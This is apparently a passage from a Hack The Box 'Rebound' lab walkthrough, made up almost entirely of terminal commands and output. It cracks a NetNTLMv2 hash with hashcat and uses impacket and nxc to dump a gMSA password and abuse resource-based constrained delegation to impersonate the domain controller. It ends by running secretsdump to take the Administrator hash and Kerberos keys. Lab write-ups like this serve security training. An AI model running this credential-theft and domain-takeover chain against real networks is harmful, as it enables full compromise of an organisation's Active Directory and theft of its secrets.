* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TBRADY::rebound:7e75a6761804e084:26a0a51afa084cd44c4738d0de4fa4cb:0101000000000000006f9e4f4f70db01892724e8dbdb603b0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800006f9e4f4f70db010600040006000000080030003000000000000000010000000020000056ad783ae796ab6c89c592edc51e80d08ac5a550ded4dda3882dd6156297a55f0a00100000000000000000000000000000000000090000000000000000000000:543BOMBOMBUNmanda
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TBRADY::rebound:7e75a6761804e084:26a0a51afa084cd44c...000000
Time.Started.....: Mon Aug 10 03:35:54 2026 (4 secs)
Time.Estimated...: Mon Aug 10 03:35:58 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3293.0 kH/s (1.35ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12197888/14344385 (85.04%)
Rejected.........: 0/12197888 (0.00%)
Restore.Point....: 12189696/14344385 (84.98%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 5440166 -> 539264
Hardware.Mon.#01.: Util: 54%

Started: Mon Aug 10 03:35:42 2026
Stopped: Mon Aug 10 03:35:58 2026

```

```bash
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ sudo impacket-getTGT -dc-ip "dc01.rebound.htb" rebound.htb/'tbrady:543BOMBOMBUNmanda'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in tbrady.ccache
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ export KRB5CCNAME=tbrady.cache

```

```bash
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ sudo nxc ldap rebound.htb -d rebound.htb --use-kcache --gmsa SMB rebound.htb 445 DC01 
[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False) LDAPS rebound.htb 636 DC01 [+] rebound.htb\tbrady from ccache LDAPS rebound.htb 636 DC01 [*] Getting GMSA Passwords LDAPS rebound.htb 636 DC01 Account: delegator$ NTLM: 45326e68995ec3b859228fd504be8617
```

```bash
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ sudo impacket-getTGT -dc-ip rebound.htb rebound.htb/delegator\$ -hashes :45326e68995ec3b859228fd504be8617 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in delegator$.ccache
```

```bash
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ export KRB5CCNAME='delegator$.ccache' 
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ klist 
Ticket cache: FILE:delegator$.ccache Default principal: delegator$@REBOUND.HTB Valid starting Expires Service principal 01/01/2025 06:32:01 01/01/2025 16:32:01 krbtgt/REBOUND.HTB@REBOUND.HTB renew until 01/02/2025 06:31:56 
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ ./rbcd-ldapfix.py -no-pass -k rebound.htb/delegator\$ -delegate-to delegator\$ delegate-from ldap_monitor -dc-ip rebound.htb -use-ldaps -action write 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty 
[*] Delegation rights modified successfully! 
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy 
[*] Accounts allowed to act on behalf of other identity: 
[*] ldap_monitor (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

```bash
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ sudo impacket-getTGT -dc-ip dc01.rebound.htb rebound.htb/ldap_monitor:'1GR8t@$$4u' 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Saving ticket in ldap_monitor.ccache
```

```bash
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ export KRB5CCNAME=ldap_monitor.ccache 
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ sudo impacket-getST -spn browser/dc01.rebound.htb -impersonate "dc01$" rebound.htb/ldap_monitor -k -no-pass 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Impersonating dc01$ 
[*] Requesting S4U2self 
[*] Requesting S4U2Proxy 
[*] Saving ticket in dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

```bash
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ export KRB5CCNAME=dc01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
┌──(kali㉿kali)-[~/Work/KerRelay]
└─$ sudo impacket-getST -spn http/dc01.rebound.htb -impersonate dc01\$ -additional ticket 'dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache' -hashes :45326e68995ec3b859228fd504be8617 -no-pass -k -dc-ip rebound.htb rebound.htb/delegator\$ 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Getting TGT for user 
[*] Impersonating dc01$ 
[*] Using additional ticket dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self 
[*] Requesting S4U2Proxy 
[*] Saving ticket in dc01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

```bash
┌──(kali ㉿ kali)-[~/RedteamNotes/HTB/Rebound] 
└─$ export KRB5CCNAME='dc01$@http_dc01.rebound.htb@REBOUND.HTB.ccache' 
┌──(kali ㉿ kali)-[~/RedteamNotes/HTB/Rebound] 
└─$ sudo impacket-secretsdump dc01.rebound.htb -k -just-dc-user administrator 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) 
[*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:: : 
[*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1 96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1 Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f Administrator:des-cbc-md5:ad8ac2a825fe1080 
[*] Cleaning up...
```